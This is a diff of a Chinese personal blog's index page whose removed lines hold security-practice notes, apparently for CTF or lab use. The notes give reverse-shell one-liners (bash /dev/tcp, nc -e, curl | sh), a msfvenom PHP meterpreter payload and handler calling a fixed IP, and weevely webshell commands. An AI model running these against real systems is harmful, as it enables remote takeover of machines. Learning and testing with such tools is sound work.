-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45588247/article/details/119614618">(4条消息) 【工具使用】——Metasploit(MSF)使用详解(超详细)_metasploit使用教程_剑客 getshell的博客-CSDN博客</a></p>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44268918/article/details/129771330">(9条消息) 云服务器在CentOS7中安装msf工具_centos7安装msf_剁椒鱼头没剁椒的博客-CSDN博客</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 0.0.0.0</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport </span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=101.43.182.125 LPORT=9999 R &gt; test.php</span><br></pre></td></tr></table></figure>
-
-<h3 id="bash-反弹shell"><a href="#bash-反弹shell" class="headerlink" title="bash 反弹shell"></a>bash 反弹shell</h3><p><strong>查询当前shell命令</strong>  <strong>ls -l &#x2F;bin&#x2F;sh</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/101.43.182.125/5000 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-<p>由于有的docker并没有bash命令，可以配合使用curl指令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 1. On your machine:</span><br><span class="line">#      nc -l 1337</span><br><span class="line">#</span><br><span class="line"># 2. On the target machine:</span><br><span class="line">curl https://your-shell.com/yourip:1337 | sh</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://your-shell.com/101.43.182.125:5000 | sh</span><br></pre></td></tr></table></figure>
-
-<p>由于我的云服务器已经开起了http服务，但是我并不想在我的网站下放内容所以</p>
-<p>可以使用python3 快速创建一个http 服务在某个端口</p>
-<p>cd，到你想要的某个文件夹</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 端口</span><br></pre></td></tr></table></figure>
-
-<p>在该端口下创建一个文件</p>
-<h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><p>反向连接</p>
-<p>攻击机执行：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 12345</span><br></pre></td></tr></table></figure>
-
-<p>靶机执行：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 101.43.182.125 5000 -e /bin/sh</span><br></pre></td></tr></table></figure>
-
-<h2 id="weevely"><a href="#weevely" class="headerlink" title="weevely"></a>weevely</h2><p>linux中的菜刀</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/106587791">(10条消息) Weevely(Linux中的菜刀)_zhang三的博客-CSDN博客</a></p>
-<p>weevely:生成以及连接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely generate &lt;连接密码&gt; &lt;path&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely &lt;url&gt; &lt;连接密码&gt;</span><br></pre></td></tr></table></figure>
-
-<p>展示真实用户</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:audit_etcpasswd -real</span><br></pre></td></tr></table></figure>
-
-<p> 反弹shell </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backdoor_reversetcp 192.168.1.9 3366</span><br></pre></td></tr></table></figure>
-
-<h2 id="tplmap-下载安装"><a href="#tplmap-下载安装" class="headerlink" title="tplmap 下载安装"></a>tplmap 下载安装</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/epinna/tplmap</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
-
-<p>如果安装成功即可使用</p>
-<p>若出<strong>error: subprocess-exited-with-error</strong>，这里我忘记截屏了则参考这个</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ktsm/p/15691652.html">kali 下安装tplmap - KittySmith - 博客园 (cnblogs.com)</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 进入家目录</span><br><span class="line">cd </span><br><span class="line"></span><br><span class="line">#建立目录ins-pip2</span><br><span class="line">mkdir ins-pip2</span><br><span class="line"></span><br><span class="line">#下载pip2安装脚本</span><br><span class="line">wget  https://bootstrap.pypa.io/pip/2.6/get-pip.py</span><br><span class="line"></span><br><span class="line">#python2执行 需要sudo权限</span><br><span class="line">sudo python2 get-pip.py</span><br><span class="line"></span><br><span class="line">#升级pip2</span><br><span class="line">sudo pip2 install --upgrade pip </span><br><span class="line"></span><br><span class="line">#安装pip2扩展工具，不然后面安装还是报错</span><br><span class="line">sudo pip2 install --upgrade setuptools </span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/23/%E7%AE%80%E5%8D%95sql/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
-      <meta itemprop="name" content="小zhou">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="not coder">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/23/%E7%AE%80%E5%8D%95sql/" class="post-title-link" itemprop="url">easysql</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-03-23 21:32:11" itemprop="dateCreated datePublished" datetime="2023-03-23T21:32:11+08:00">2023-03-23</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-23 17:49:16" itemprop="dateModified" datetime="2023-05-23T17:49:16+08:00">2023-05-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/sql/" itemprop="url" rel="index"><span itemprop="name">sql</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.2k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>4 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p> 我是菜狗。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/03/23/%E7%AE%80%E5%8D%95sql/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1515,7 +1574,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-count">44</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1528,7 +1587,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-count">24</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -1564,12 +1623,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">57k</span>
+    <span title="站点总字数">60k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:28</span>
+    <span title="站点阅读时长">3:38</span>
 </div>
 
 <!--
